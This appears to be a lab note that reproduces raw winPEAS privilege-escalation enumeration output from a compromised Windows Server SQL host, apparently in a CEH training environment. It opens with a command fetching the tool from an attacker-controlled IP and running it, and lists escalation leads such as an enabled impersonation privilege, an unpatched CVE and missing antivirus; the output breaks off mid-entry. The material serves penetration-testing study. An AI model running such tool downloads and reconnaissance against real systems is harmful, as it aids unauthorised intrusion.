---
{"dg-publish":true,"permalink":"/example-winpeas-output/"}
---

```powershell
PS C:\Users\Public\Downloads> wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
PS C:\Users\Public\Downloads> ./winpeas.exe
./winpeas.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


                                   ͹ System Information                                      

          ͹ Basic System Information
  Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows Server 2019 Standard
    OS Version: American Megatrends Inc. 090008 , 12/7/2018
    System Type: x64-based PC
    Hostname: SQL_srv
    Domain Name: CEH.com
    ProductName: Windows Server 2019 Standard
    EditionID: ServerStandard
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 4
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 7/10/2025 8:01:59 AM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB4537490, KB4512577, KB4537759, KB4549947, KB4549949, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1809 (17763)
 [*] Enumerating installed KBs...
 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 1 potential vulnerabilities.


          ͹ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

          ͹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    11/7/2024 5:06:31 AM

          ͹ User Environment Variables
  Check for some passwords or keys in the env variables 
    COMPUTERNAME: SQL_SRV
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local
    PSModulePath: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\Microsoft MPI\Bin\;C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\160\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\DTS\Binn\;C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    USERPROFILE: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS
    SystemRoot: C:\Windows
    OS: Windows_NT
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 5507
    USERNAME: MSSQL$SQLEXPRESS
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    MSMPI_BENCHMARKS: C:\Program Files\Microsoft MPI\Benchmarks\
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 4
    APPDATA: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Roaming
    MSMPI_BIN: C:\Program Files\Microsoft MPI\Bin\
    TMP: C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: NT Service
    USERDNSDOMAIN: CEH.com

          ͹ System Environment Variables
  Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Program Files\Microsoft MPI\Bin\;C:\Program Files (x86)\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\160\DTS\Binn\;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\DTS\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 4
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
    PROCESSOR_REVISION: 5507
    MSMPI_BIN: C:\Program Files\Microsoft MPI\Bin\
    MSMPI_BENCHMARKS: C:\Program Files\Microsoft MPI\Benchmarks\

          ͹ Audit Settings
  Check what is being logged 
    Not Found

          ͹ Audit Policy Settings - Classic & Advanced

          ͹ WEF Settings
  Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

          ͹ LAPS Settings
  If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

          ͹ Wdigest
  If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

          ͹ LSA Protection
  If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

          ͹ Credentials Guard
  If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

          ͹ Cached Creds
  If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

          ͹ Enumerating saved credentials in Registry (CurrentPass)

          ͹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

          ͹ Windows Defender configuration
  Local Settings
  Group Policy Settings

          ͹ UAC Status
  If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

          ͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

          ͹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

          ͹ PS default transcripts history
  Read the PS history inside these files (if any)

          ͹ HKCU Internet Settings
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/5.0 (compatible; MSIE 9.0; Win32)
    CertificateRevocation: 1

          ͹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

          ͹ Drives Information
  Remember that you should search more info inside the other drives 
    A:\ (Type: Removable)
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 52 GB)(Permissions: Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

          ͹ Checking WSUS
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

          ͹ Checking KrbRelayUp
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (NT Service) so it could be vulnerable.
  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

          ͹ Checking If Inside Container
  If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

          ͹ Checking AlwaysInstallElevated
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

          ͹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       740
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

          ͹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

          ͹ Display Local Group Policy settings - local users/machine

          ͹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



          ͹ Enumerating Printers (WMI)
      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              False
      Is network printer:      False

   =================================================================================================

      Name:                    Microsoft Print to PDF
      Status:                  Unknown
      Sddl:                    O:SYD:(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              True
      Is network printer:      False

   =================================================================================================


          ͹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  MSSQL$SQLEXPRESS\sql\query                                                                           Everyone [WriteData/CreateFiles], MSSQL$SQLEXPRESS [AppendData/CreateDirectories] O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133G:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)

  SQLLocal\SQLEXPRESS                                                                                  Everyone [WriteData/CreateFiles], MSSQL$SQLEXPRESS [AppendData/CreateDirectories] O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133G:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)


          ͹ Enumerating AMSI registered providers

          ͹ Enumerating Sysmon configuration
      You must be an administrator to run this check

          ͹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

          ͹ Installed .NET versions

  CLR Versions
   2.0.50727
   4.0.30319

  .NET Versions
   3.5.30729.4926
   4.7.03190

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : False
      OS supports AMSI               : True


                                   ͹ Interesting Events information                                      

          ͹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

          ͹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

          ͹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

          ͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.


          ͹ Displaying Power off/on events for last 5 days



                                   ͹ Users Information                                      

          ͹ Users
  Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  Current user: MSSQL$SQLEXPRESS
  Current groups: Everyone, Builtin\Performance Monitor Users, Users, Service, Console Logon, Authenticated Users, This Organization, Local, NT Services\All Services
   =================================================================================================

    SQL_SRV\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    SQL_SRV\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    SQL_SRV\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    SQL_SRV\Jason
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    SQL_SRV\Martin
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    SQL_SRV\Shiela
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    SQL_SRV\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


          ͹ Current User Idle Time
   Current User   :     NT Service\MSSQL$SQLEXPRESS
   Idle Time      :     00h:48m:56s:453ms

          ͹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

          ͹ Current Token privileges
  Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

          ͹ Clipboard text

          ͹ Logged users
    NT SERVICE\MSSQLFDLauncher$SQLEXPRESS
    NT SERVICE\MSSQLLaunchpad$SQLEXPRESS
    NT Service\MSSQL$SQLEXPRESS
    NT SERVICE\SQLTELEMETRY$SQLEXPRESS

          ͹ Display information about local users
   Computer Name           :   SQL_SRV
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   6/19/2024 4:07:10 AM
   Logons Count            :   8
   Password Last Set       :   4/14/2020 9:26:21 PM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   Jason
   User Id                 :   1000
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   4/15/2020 12:17:28 AM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   Martin
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   4/15/2020 12:17:46 AM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   Shiela
   User Id                 :   1002
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   4/15/2020 12:18:13 AM

   =================================================================================================

   Computer Name           :   SQL_SRV
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   4/15/2020 12:24:25 AM

   =================================================================================================


          ͹ RDP Sessions
    Not Found

          ͹ Ever logged users
    IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    NT SERVICE\MSSQLFDLauncher$SQLEXPRESS
    NT SERVICE\MSSQLLaunchpad$SQLEXPRESS
    NT Service\MSSQL$SQLEXPRESS
    NT SERVICE\SQLTELEMETRY$SQLEXPRESS
    SQL_SRV\Administrator
    CEH\SQL_srv

          ͹ Home folders found
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Service [WriteData/CreateFiles]
    C:\Users\SQL_srv

          ͹ Looking for AutoLogon credentials
    Not Found

          ͹ Password Policies
  Check for a possible brute-force 
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)
   at winPEAS.Info.UserInfo.UserInfoHelper.GetPasswordPolicy()
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================


          ͹ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     311664
    Logon Time:                   
    Logon Type:                   Service
    Start Time:                   7/10/2025 7:15:30 AM
    Domain:                       NT Service
    Authentication Package:       Negotiate
    Start Time:                   7/10/2025 7:15:30 AM
    User Name:                    MSSQL$SQLEXPRESS
    User Principal Name:          
    User SID:                     

   =================================================================================================



                                   ͹ Processes Information                                      

          ͹ Interesting Processes -non Microsoft-
  Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
    sqlservr(5704)[C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe] -- POwn: MSSQL$SQLEXPRESS
    Command Line: "C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS
   =================================================================================================

    conhost(2740)[C:\Windows\system32\conhost.exe] -- POwn: MSSQL$SQLEXPRESS
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    powershell(1908)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: MSSQL$SQLEXPRESS
    Command Line: powershell
   =================================================================================================

    fdhost(4500)[C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\fdhost.exe]
    Command Line: "C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Binn\fdhost.exe" "MSSQL16.SQLEXPRESSDe9c00410f21f4f4324fb316fd4f8ca4986329033" "MSSQL16.SQLEXPRESS" "MSSQL16.SQLEXPRESS" "8" "" "4096" "M" "0" "" "" "" 
   =================================================================================================

    znOAi(3064)[C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\znOAi.exe] -- POwn: MSSQL$SQLEXPRESS
    Permissions: MSSQL$SQLEXPRESS [AllAccess]
    Possible DLL Hijacking folder: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Temp (MSSQL$SQLEXPRESS [AllAccess])
    Command Line: "C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\znOAi.exe" 
   =================================================================================================

    cmd(5004)[C:\Windows\SysWOW64\cmd.exe] -- POwn: MSSQL$SQLEXPRESS
    Command Line: C:\Windows\system32\cmd.exe
   =================================================================================================

    winpeas(2172)[C:\Users\Public\Downloads\winpeas.exe] -- POwn: MSSQL$SQLEXPRESS -- isDotNet
    Permissions: MSSQL$SQLEXPRESS [AllAccess], Service [WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Users\Public\Downloads (Service [WriteData/CreateFiles])
    Command Line: "C:\Users\Public\Downloads\winpeas.exe"
   =================================================================================================


          ͹ Vulnerable Leaked Handlers
   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
  Getting Leaked Handlers, it might take some time...
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)
   at winPEAS.Native.Classes.UNICODE_STRING.Dispose(Boolean disposing)
    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
